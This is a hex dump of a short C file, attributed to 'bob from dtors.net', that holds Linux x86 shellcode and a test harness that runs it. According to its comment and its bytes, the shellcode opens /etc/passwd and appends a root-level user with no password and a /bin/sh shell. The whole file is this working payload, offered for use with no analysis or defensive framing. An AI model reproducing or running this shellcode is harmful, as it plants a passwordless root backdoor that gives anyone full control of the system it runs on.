00000000  2f 2a 20 4c 69 6e 75 78  20 78 38 36 20 73 68 65  |/* Linux x86 she|
00000010  6c 6c 63 6f 64 65 2c 20  74 6f 20 6f 70 65 6e 28  |llcode, to open(|
00000020  29 20 77 72 69 74 65 28  29 20 63 6c 6f 73 65 28  |) write() close(|
00000030  29 20 61 6e 64 20 2a 2f  0d 0a 2f 2a 20 65 78 69  |) and */../* exi|
00000040  74 28 29 2c 20 61 64 64  73 20 61 20 72 6f 6f 74  |t(), adds a root|
00000050  20 75 73 65 72 20 6e 6f  2d 70 61 73 73 77 64 20  | user no-passwd |
00000060  74 6f 20 2f 65 74 63 2f  70 61 73 73 77 64 20 2a  |to /etc/passwd *|
00000070  2f 0d 0a 2f 2a 20 42 79  20 62 6f 62 20 66 72 6f  |/../* By bob fro|
00000080  6d 20 64 74 6f 72 73 2e  6e 65 74 20 2a 2f 0d 0a  |m dtors.net */..|
00000090  0d 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
000000a0  6f 2e 68 3e 0d 0a 0d 0a  63 68 61 72 20 73 68 65  |o.h>....char she|
000000b0  6c 6c 63 6f 64 65 5b 5d  3d 0d 0a 09 09 22 5c 78  |llcode[]=...."\x|
000000c0  33 31 5c 78 63 30 5c 78  33 31 5c 78 64 62 5c 78  |31\xc0\x31\xdb\x|
000000d0  33 31 5c 78 63 39 5c 78  35 33 5c 78 36 38 5c 78  |31\xc9\x53\x68\x|
000000e0  37 33 5c 78 37 33 5c 78  37 37 22 0d 0a 09 09 22  |73\x73\x77"...."|
000000f0  5c 78 36 34 5c 78 36 38  5c 78 36 33 5c 78 32 66  |\x64\x68\x63\x2f|
00000100  5c 78 37 30 5c 78 36 31  5c 78 36 38 5c 78 32 66  |\x70\x61\x68\x2f|
00000110  5c 78 32 66 5c 78 36 35  5c 78 37 34 22 0d 0a 09  |\x2f\x65\x74"...|
00000120  09 22 5c 78 38 39 5c 78  65 33 5c 78 36 36 5c 78  |."\x89\xe3\x66\x|
00000130  62 39 5c 78 30 31 5c 78  30 34 5c 78 62 30 5c 78  |b9\x01\x04\xb0\x|
00000140  30 35 5c 78 63 64 5c 78  38 30 5c 78 38 39 22 0d  |05\xcd\x80\x89".|
00000150  0a 09 09 22 5c 78 63 33  5c 78 33 31 5c 78 63 30  |..."\xc3\x31\xc0|
00000160  5c 78 33 31 5c 78 64 32  5c 78 36 38 5c 78 36 65  |\x31\xd2\x68\x6e|
00000170  5c 78 32 66 5c 78 37 33  5c 78 36 38 5c 78 36 38  |\x2f\x73\x68\x68|
00000180  22 0d 0a 09 09 22 5c 78  32 66 5c 78 32 66 5c 78  |"...."\x2f\x2f\x|
00000190  36 32 5c 78 36 39 5c 78  36 38 5c 78 33 61 5c 78  |62\x69\x68\x3a\x|
000001a0  33 61 5c 78 32 66 5c 78  33 61 5c 78 36 38 5c 78  |3a\x2f\x3a\x68\x|
000001b0  33 61 22 0d 0a 09 09 22  5c 78 33 30 5c 78 33 61  |3a"...."\x30\x3a|
000001c0  5c 78 33 30 5c 78 36 38  5c 78 36 32 5c 78 36 66  |\x30\x68\x62\x6f|
000001d0  5c 78 36 32 5c 78 33 61  5c 78 38 39 5c 78 65 31  |\x62\x3a\x89\xe1|
000001e0  5c 78 62 32 22 0d 0a 09  09 22 5c 78 31 34 5c 78  |\xb2"...."\x14\x|
000001f0  62 30 5c 78 30 34 5c 78  63 64 5c 78 38 30 5c 78  |b0\x04\xcd\x80\x|
00000200  33 31 5c 78 63 30 5c 78  62 30 5c 78 30 36 5c 78  |31\xc0\xb0\x06\x|
00000210  63 64 5c 78 38 30 22 0d  0a 09 09 22 5c 78 33 31  |cd\x80"...."\x31|
00000220  5c 78 63 30 5c 78 62 30  5c 78 30 31 5c 78 63 64  |\xc0\xb0\x01\xcd|
00000230  5c 78 38 30 22 3b 0d 0a  0d 0a 69 6e 74 0d 0a 6d  |\x80";....int..m|
00000240  61 69 6e 28 29 0d 0a 7b  0d 0a 20 20 20 20 20 20  |ain()..{..      |
00000250  20 20 76 6f 69 64 20 28  2a 64 73 72 29 20 28 29  |  void (*dsr) ()|
00000260  3b 0d 0a 20 20 20 20 20  20 20 20 28 6c 6f 6e 67  |;..        (long|
00000270  29 20 64 73 72 20 3d 20  26 73 68 65 6c 6c 63 6f  |) dsr = &shellco|
00000280  64 65 3b 0d 0a 20 20 20  20 20 20 20 20 70 72 69  |de;..        pri|
00000290  6e 74 66 28 22 53 69 7a  65 3a 20 25 64 20 62 79  |ntf("Size: %d by|
000002a0  74 65 73 2e 5c 6e 22 2c  20 73 69 7a 65 6f 66 28  |tes.\n", sizeof(|
000002b0  73 68 65 6c 6c 63 6f 64  65 29 29 3b 20 0d 0a 20  |shellcode)); .. |
000002c0  20 20 20 20 20 20 20 64  73 72 28 29 3b 0d 0a 7d  |       dsr();..}|
000002d0
